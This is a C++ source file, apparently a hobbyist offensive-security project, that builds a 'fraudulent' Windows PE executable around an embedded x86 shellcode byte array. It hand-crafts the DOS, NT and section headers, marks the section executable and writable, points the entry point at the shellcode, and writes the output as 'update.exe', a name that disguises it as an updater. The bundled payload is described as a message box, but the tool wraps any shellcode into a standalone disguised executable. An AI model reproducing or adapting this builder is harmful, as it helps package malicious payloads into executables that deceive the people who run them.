/*
*  
 **PE Loader**

   * Objective: Creates a program that creates a fraudelent PE file that executes shellcode
   * by nu11ddz
*/

#include <iostream>
#include <Windows.h>
#pragma warning(disable : 4996)
#define fileAlign 0x200
#define sectAlign 0x1000
#define SECTALIGN(size, align) ((((size) / align) + 1) * (align))

	//simple msgbox shellcode
	char sc[] =
		"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
		"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
		"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
		"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
		"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
		"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
		"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
		"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

	void main() {

		//create a headers for PE file
		size_t peHeaderSize = SECTALIGN(sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER), fileAlign);
		size_t sectionDataSize = SECTALIGN(sizeof(sc), fileAlign);
		char* peData = (char*)calloc(peHeaderSize + sectionDataSize, 1);
		
		//add DOS header to PE file
		PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)peData; 
		dosHdr->e_magic = 0x5A4D; // MZ
		dosHdr->e_lfanew = sizeof(IMAGE_DOS_HEADER);

		//add NT header to end of PE file and DOS header
		PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(peData + dosHdr->e_lfanew); 
		ntHdr->Signature = IMAGE_NT_SIGNATURE; // PE
		ntHdr->FileHeader.Machine = IMAGE_FILE_MACHINE_I386;
		ntHdr->FileHeader.Characteristics = IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_32BIT_MACHINE;
		ntHdr->FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER);
		ntHdr->FileHeader.NumberOfSections = 1;

		// add optional header section to NT header
		PIMAGE_SECTION_HEADER sectHdr = (PIMAGE_SECTION_HEADER)((char*)ntHdr + sizeof(IMAGE_NT_HEADERS)); 
		memcpy(&(sectHdr->Name), ".F00F00F00", 11);
		sectHdr->VirtualAddress = 0x1000;
		sectHdr->Misc.VirtualSize = SECTALIGN(sizeof(sc), sectAlign);
		sectHdr->SizeOfRawData = sizeof(sc);
		sectHdr->PointerToRawData = peHeaderSize;
		memcpy(peData + peHeaderSize, sc, sizeof(sc));
		sectHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

		//add fake optional header
		ntHdr->OptionalHeader.AddressOfEntryPoint = sectHdr->VirtualAddress;
		ntHdr->OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR32_MAGIC;
		ntHdr->OptionalHeader.BaseOfCode = sectHdr->VirtualAddress; // .text RVA
		ntHdr->OptionalHeader.BaseOfData = 0x0000;                  // .data RVA
		ntHdr->OptionalHeader.ImageBase = 0x400000;
		ntHdr->OptionalHeader.FileAlignment = fileAlign;
		ntHdr->OptionalHeader.SectionAlignment = sectAlign;
		ntHdr->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
		ntHdr->OptionalHeader.SizeOfImage = sectHdr->VirtualAddress + sectHdr->Misc.VirtualSize;
		ntHdr->OptionalHeader.SizeOfHeaders = peHeaderSize;
		ntHdr->OptionalHeader.MajorSubsystemVersion = 5;
		ntHdr->OptionalHeader.MinorSubsystemVersion = 1;

		FILE* fp = fopen("update.exe", "wb");
		fwrite(peData, peHeaderSize + sectionDataSize, 1, fp);
	}



